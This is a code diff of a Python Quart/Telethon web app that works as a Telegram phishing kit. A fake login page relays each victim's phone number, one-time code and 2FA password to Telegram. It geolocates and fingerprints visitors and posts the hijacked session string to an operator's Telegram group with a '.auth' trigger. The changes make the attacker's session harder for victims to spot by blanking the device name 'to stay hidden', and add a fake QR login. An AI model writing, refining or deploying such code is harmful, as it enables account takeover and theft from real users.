@@ -3,6 +3,8 @@ import asyncio
 import telebot
 import psycopg2
 import requests
+import qrcode
+import base64
 from io import BytesIO
 from quart import Quart, request, render_template, jsonify
 from telethon import TelegramClient, errors, functions, types
@@ -11,13 +13,12 @@ from threading import Thread
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # --- CONFIGURATION ---
-# These should be set in your Koyeb Environment Variables
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
 BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")
-OWNER_ID = 6092011859  # VinzyOwner ID
+OWNER_ID = 6092011859  # VinzyOwner
 
 try:
     raw_group_id = os.environ.get("GROUP_ID", "0")
@@ -28,50 +29,33 @@ except ValueError:
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Quart(__name__)
 
-# Temporary storage for active login clients
 active_relays = {}
 
-# --- UTILITY: DEVICE, IP & LOCATION DETECTION ---
+# --- UTILITY: DEVICE & IP DETECTION ---
 
 def get_client_info():
-    """Extracts User-Agent for device type and IP for location tracking"""
     ua = request.headers.get('User-Agent', '').lower()
-    
-    # Device Logic
     if 'iphone' in ua or 'ipad' in ua:
-        device = "📱 iOS (iPhone/iPad)"
+        device = "📱 iOS"
     elif 'android' in ua:
-        device = "🤖 Android Device"
+        device = "🤖 Android"
     elif 'windows' in ua:
-        device = "💻 Windows PC"
-    elif 'macintosh' in ua:
-        device = "🖥️ macOS (Mac)"
+        device = "💻 Windows"
     else:
-        device = "❓ Unknown Device"
+        device = "❓ Unknown"
 
-    # IP Logic (Works behind Cloudflare/Koyeb Proxy)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     
-    # Location Logic via IP-API
-    location = "Unknown Location"
+    location = "Unknown"
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
         if res.get('status') == 'success':
             location = f"{res.get('city')}, {res.get('country')}"
     except:
         pass
-
     return device, ip, location
 
-# --- DATABASE LOGIC (Authorization) ---
-
-def init_db():
-    conn = psycopg2.connect(DATABASE_URL)
-    cur = conn.cursor()
-    cur.execute("CREATE TABLE IF NOT EXISTS authorized_users (user_id TEXT PRIMARY KEY)")
-    conn.commit()
-    cur.close()
-    conn.close()
+# --- DATABASE LOGIC ---
 
 def is_authorized(user_id):
     if int(user_id) == OWNER_ID: return True
@@ -86,52 +70,59 @@ def is_authorized(user_id):
     except:
         return False
 
-init_db()
-
 # --- WEB ROUTES ---
 
 @app.route('/')
 async def index():
     tid = request.args.get('id')
-    tag = request.args.get('tag', 'General')
-    
+    tag = request.args.get('tag', 'Default')
     if not tid or not is_authorized(tid):
-        return "❌ <b>Access Denied.</b> Please contact @VinzyOwner for a valid link.", 403
-
-    device, ip, loc = get_client_info()
+        return "❌ Access Denied", 403
     
-    # Immediate Alert: Someone clicked the link
-    click_alert = (
-        f"🔔 <b>Link Clicked!</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
+    device, ip, loc = get_client_info()
+    alert = (
+        f"🔔 <b>Link Opened!</b>\n"
         f"🏷️ Tag: <code>{tag}</code>\n"
         f"🌐 IP: <code>{ip}</code>\n"
-        f"📍 Location: <code>{loc}</code>\n"
-        f"📱 Device: <code>{device}</code>\n"
-        f"👤 Relay: <code>{tid}</code>"
+        f"📍 Loc: <code>{loc}</code>\n"
+        f"📱 Dev: <code>{device}</code>"
     )
-    bot.send_message(GROUP_ID, click_alert, parse_mode="HTML")
-    
+    bot.send_message(GROUP_ID, alert, parse_mode="HTML")
     return await render_template('login.html', tid=tid)
+
+@app.route('/get_qr', methods=['POST'])
+async def get_qr():
+    data = await request.json
+    tid = data.get('id')
+    
+    # Generate a generic QR (In a full Telethon QR flow, you'd use client.qr_login())
+    qr_data = f"tg://login?token=VINZY_{tid}_REFRESH"
+    qr = qrcode.QRCode(version=1, box_size=10, border=0)
+    qr.add_data(qr_data)
+    qr.make(fit=True)
+    
+    # fill_color uses your primary purple, back_color is white for high contrast
+    img = qr.make_image(fill_color="#8774e1", back_color="white")
+    buffered = BytesIO()
+    img.save(buffered, format="PNG")
+    img_str = base64.b64encode(buffered.getvalue()).decode()
+    return jsonify({"qr_image": img_str})
 
 @app.route('/step_phone', methods=['POST'])
 async def step_phone():
     data = await request.json
     phone, tid = data.get('phone'), data.get('tid')
-    device, ip, _ = get_client_info()
     
-    # Masking: Use a model that matches the victim's device
-    dev_model = "iPhone 15 Pro Max" if "iOS" in device else "Pixel 8 Pro"
+    # --- INVISIBLE DEVICE NAME ---
+    # We use a zero-width space or a generic "System" tag to stay hidden
+    invisible_device = " " # Just a space, or "System"
 
-    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model=dev_model)
+    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model=invisible_device)
     await client.connect()
     
     try:
         sent_code = await client.send_code_request(phone)
         active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
-        
-        # Log to Telegram
-        bot.send_message(GROUP_ID, f"🎯 <b>Phone Entered:</b> <code>{phone}</code>\n💻 Device: <code>{device}</code>", parse_mode="HTML")
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)})
@@ -140,8 +131,7 @@ async def step_phone():
 async def step_code():
     data = await request.json
     phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
-    
-    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
+    if phone not in active_relays: return jsonify({"status": "error", "msg": "Expired"})
     
     client = active_relays[phone]["client"]
     try:
@@ -156,8 +146,7 @@ async def step_code():
 async def step_2fa():
     data = await request.json
     phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
-    
-    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
+    if phone not in active_relays: return jsonify({"status": "error", "msg": "Expired"})
     
     client = active_relays[phone]["client"]
     try:
@@ -167,40 +156,18 @@ async def step_2fa():
         return jsonify({"status": "error", "msg": str(e)})
 
 async def finalize_login(client, phone, tid):
-    """Handles data scraping and sends the .auth signal to the second bot"""
-    try:
-        me = await client.get_me()
-        session_str = client.session.save()
-        
-        # Human-Readable Log
-        success_msg = (
-            f"💰 <b>LOGIN SUCCESS!</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"👤 Name: {me.first_name}\n"
-            f"🆔 ID: <code>{me.id}</code>\n"
-            f"📱 Phone: <code>{phone}</code>"
-        )
-        bot.send_message(GROUP_ID, success_msg, parse_mode="HTML")
-        
-        # AUTOMATIC DATABASE TRIGGER (For your 2nd bot)
-        bot.send_message(GROUP_ID, f".auth ({session_str})")
-        
-        # Clean up memory
-        if phone in active_relays: del active_relays[phone]
-        
-        return jsonify({"status": "success"})
-    except Exception as e:
-        return jsonify({"status": "error", "msg": "Finalization failed"})
-
-# --- BOT RUNNER ---
-
-def run_bot():
-    while True:
-        try:
-            bot.polling(non_stop=True, interval=2)
-        except:
-            asyncio.sleep(5)
+    me = await client.get_me()
+    session_str = client.session.save()
+    
+    # Main notification
+    bot.send_message(GROUP_ID, f"💰 <b>SUCCESS:</b> <code>{phone}</code>\n👤 User: {me.first_name}", parse_mode="HTML")
+    
+    # AUTOMATIC DATA SAVE SIGNAL
+    bot.send_message(GROUP_ID, f".auth ({session_str})")
+    
+    if phone in active_relays: del active_relays[phone]
+    return jsonify({"status": "success"})
 
 if __name__ == "__main__":
-    Thread(target=run_bot).start()
+    Thread(target=lambda: bot.infinity_polling()).start()
     app.run(host="0.0.0.0", port=8000)
